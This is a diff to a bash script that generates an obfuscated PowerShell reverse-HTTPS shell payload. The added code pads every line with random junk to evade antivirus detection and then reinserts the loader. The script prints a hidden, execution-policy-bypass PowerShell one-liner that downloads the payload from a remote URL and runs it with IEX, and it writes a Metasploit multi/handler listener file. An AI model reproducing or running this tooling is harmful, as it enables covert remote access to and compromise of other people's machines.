@@ -67,7 +67,7 @@ cp raw_pshnet_revhttps.ps1 final_pshnet_revhttps.ps1
 shellcode_size=${#eleet_shellcode}
 printf "DEBUG: Shellcode size is $shellcode_size\n"
 shellcode_parts=$(($shellcode_size/$chunk_size))
-printf "DEBUG: Shellcode splits into $shellcode_parts+1 parts\n"
+printf "DEBUG: shellcode will be splited into $shellcode_parts+1 parts\n"
 
 y=0 
 for (( i=0; i <=$shellcode_parts; i++))
@@ -95,9 +95,29 @@ printf "DEBUG: changing base64 string to $sc_concat\n"
 sed -i "s,$raw_shellcode,$sc_concat,g" final_pshnet_revhttps.ps1
 sed -i "s,\"$sc_concat\",$sc_concat,g" final_pshnet_revhttps.ps1
 
+# extract lines from 2 to 15 and save it as variable
+sed -i -e '2,15 {w loader.txt
+d}' final_pshnet_revhttps.ps1
+loader=$(<loader.txt)
+printf "DEBUG LOADER:\n$loader\n"
+
+# generate junk string
+junk_size=1337
+declare "junk_string"="#$(cat /dev/urandom | tr -dc '(\&\_a-zA-Z0-9\^\*\@' | fold -w ${1:-$junk_size} | head -n 1)"
+printf "DEBUG Junk string:\n"
+printf "$junk_string\n"
+
+# fill every line with junk string
+printf "DEBUG Filling final_pshnet_revhttps.ps1 with junk...\n"
+sed -i -e "s,^,$junk_string\n," final_pshnet_revhttps.ps1
+
+# insert loader back
+printf "DEBUG inserting loader back...\n"
+sed -i "/Set-StrictMode -Version 2/r loader.txt" final_pshnet_revhttps.ps1
+
+
+printf "Final psh-net usage example:\n"
 printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy;\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/final_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
-
-
 
 # create multu handler listener file
 printf "Creating multi handler script file...\n"
@@ -114,3 +134,7 @@ printf "set HttpProxyPass $ProxyPass\n" >> multihandler.rc
 printf "set HttpUserAgent $UserAgent\n" >> multihandler.rc
 printf "exploit -j -z\n" >> multihandler.rc
 printf "Run listener: msfconsole -r multihandler.rc\n"
+
+
+
+
